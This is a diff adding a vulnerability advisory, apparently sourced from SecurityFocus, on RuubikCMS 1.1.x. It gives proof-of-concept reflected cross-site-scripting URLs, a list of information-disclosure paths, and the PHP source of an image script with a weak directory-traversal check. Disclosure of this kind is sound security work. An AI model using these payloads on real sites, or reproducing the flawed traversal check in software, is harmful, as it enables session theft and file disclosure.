@@ -1,0 +1,112 @@
+source: http://www.securityfocus.com/bid/53655/info
+
+RuubikCMS is prone to multiple cross-site-scripting vulnerabilities, multiple information-disclosure vulnerabilities, and directory-traversal vulnerability.
+
+Attackers may leverage these issues to steal cookie-based authentication credentials, to execute arbitrary script code in the browser, and to retrieve arbitrary files from the affected system in the context of the affected site by using specially crafted request messages with directory-traversal sequences. This may allow the attacker to obtain sensitive information; other attacks are also possible.
+
+RuubikCMS 1.1.0 and 1.1.1 are vulnerable. 
+
+
+cross-site-scripting:
+
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/folders.php?type=image&folder=&feid="/>a<script>alert(1);</script>
+
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image&folder=&feid="</a><script>alert(1);</script>
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image"</a><script>alert(1);</script>&folder=&feid=owned
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/upload.php?feid="</a><script>alert("AkaStep");</script>
+
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/edit.php?type=image&folder=&find="><script>alert("AkaStep");</script>
+
+
+
+Information-disclosure:
+
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/error.log
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/newsmenu.php
+
+http://www.example.com/learn/ruubikcms/extra/login/session.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/dbconnection.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/extrapagemenu.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/footer.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/head.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/mainmenu.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/multilang.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/newsmenu.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/pagemenu.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/required.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/snippetmenu.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/includes/usersmenu.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/cms/login/form.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/filelink/filelink.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tb_standalone.js.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tb_tinymce.js.php
+
+http://www.example.com/learn/ruubikcms/ruubikcms/website/scripts/jquery.lightbox-0.5.js.php
+
+
+
+Traversal vuln:
+==============SNIP==================
+<?php
+// --- Image displayer with authentication
+// --- Sample call: image.php?f=imgfile.jpg
+// --- Sample call with subfolder: image.php?f=subfolder/imgfile.jpg
+
+require('../ruubikcms/includes/dbconfig.php');
+$dbh = new PDO(PDO_DB_DRIVER.':../'.RUUBIKCMS_FOLDER.'/'.PDO_DB_FOLDER.'/'.PDO_DB_NAME); // database connection object
+require('../ruubikcms/includes/commonfunc.php');
+define('LOGOUT_TIME', query_single("SELECT logout_time FROM options WHERE id = 1"));
+require('login/session.php');
+
+// check if logged in
+if (!@$_SESSION['uid']) die("Access denied.");
+
+// images directory
+define('BASE_DIR','useruploads/images/');
+
+// make sure program execution doesn't time out
+@set_time_limit(0);
+
+if (!isset($_GET['f']) OR empty($_GET['f'])) die("Please specify image.");
+if (strstr($_GET['f'], '../')) die('Error');
+$fpath = BASE_DIR.$_GET['f'];
+if (!is_file($fpath)) die("File does not exist.");
+
+// file size in bytes
+// $fsize = filesize($fpath);
+
+// get mime type
+$mtype = '';
+
+if (function_exists('mime_content_type')) {
+  $mtype = mime_content_type($fpath);
+} elseif (function_exists('finfo_file')) {
+  $finfo = finfo_open(FILEINFO_MIME); // return mime type
+  $mtype = finfo_file($finfo, $fpath);
+  finfo_close($finfo);
+}
+
+if ($mtype == '') {
+  $mtype = "image/jpeg";
+}
+
+header("Content-type: $mtype");
+readfile($fpath);
+?>
+=====================================
